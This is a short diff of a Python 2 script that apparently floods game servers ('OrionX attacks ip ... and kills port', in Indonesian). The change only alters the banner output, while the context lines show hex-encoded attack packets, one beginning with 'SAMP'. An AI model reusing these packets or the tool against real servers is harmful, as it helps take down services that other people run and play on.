@@ -37,9 +37,9 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                        ]
 
-print colored("##########################################", ('red'))
-print colored("OrionX Menyerang ip: %s Dan Membunuh Port: %s"%(orgip,port), ('red'))
-print colored("##########################################", ('red'))
+print colored("#################################################", ('red'))
+print_slow("OrionX Menyerang ip: %s Dan Membunuh Port: %s"%(orgip,port))
+print colored("#################################################", ('red'))
 
             
 
